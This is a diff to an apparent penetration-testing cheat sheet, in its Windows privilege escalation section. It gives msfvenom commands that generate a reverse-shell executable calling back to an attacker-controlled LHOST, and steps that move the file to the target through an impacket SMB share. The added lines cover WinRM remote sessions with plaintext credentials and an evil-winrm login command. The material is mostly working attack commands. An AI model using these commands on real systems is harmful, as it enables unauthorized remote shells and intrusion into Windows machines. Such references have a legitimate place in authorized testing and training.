@@ -3932,10 +3932,19 @@ int main () {
 - Note: [32-bit and 64-bit Windows: Frequently asked questions](https://support.microsoft.com/en-us/windows/32-bit-and-64-bit-windows-frequently-asked-questions-c6ca9541-8dce-4d48-0415-94a3faa2e13d)
 
 #### <ins>Generate a reverse shell</ins>
+
 1. Generate the reverse shell on your attacker machine: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o reverse.exe`
 2. Transfer it to the Windows machine with SMB: `sudo python3 /opt/impacket/examples/smbserver.py kali .` and then `copy \\<IP>\kali\reverse.exe C:\PrivEsc\reverse.exe`
 
-Check also: [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
+Create a PowerShell remoting session via WinRM
+1. `$password = ConvertTo-SecureString <password> -AsPlainText -Force`
+2. `$cred = New-Object System.Management.Automation.PSCredential("<password>", $password)`
+3. `Enter-PSSession -ComputerName <computer_name> -Credential $cred`
+
+Check also:
+- [Windows Reverse Shells Cheatsheet](https://podalirius.net/en/articles/windows-reverse-shells-cheatsheet/)
+- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
+  - `evil-winrm -i <IP> -u <username> -p <password>`
 
 #### <ins>Kernel Exploits</ins>
 
